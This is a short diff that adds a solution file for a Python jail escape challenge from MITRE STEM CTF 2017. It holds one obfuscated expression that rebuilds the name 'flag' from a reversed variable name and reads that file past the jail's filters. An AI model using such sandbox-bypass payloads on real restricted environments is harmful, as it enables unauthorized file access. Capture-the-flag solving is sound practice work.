@@ -1,0 +1,5 @@
+# Python Jail Escape Challenge Solution for MITRE STEM CTF 2017
+# Author: Eugene Kolodenker <eugene@eugenekolo.com>
+
+max(open(str(bytearray(reversed([list(vars())[6]for(galf)in[0]][0])))))
+
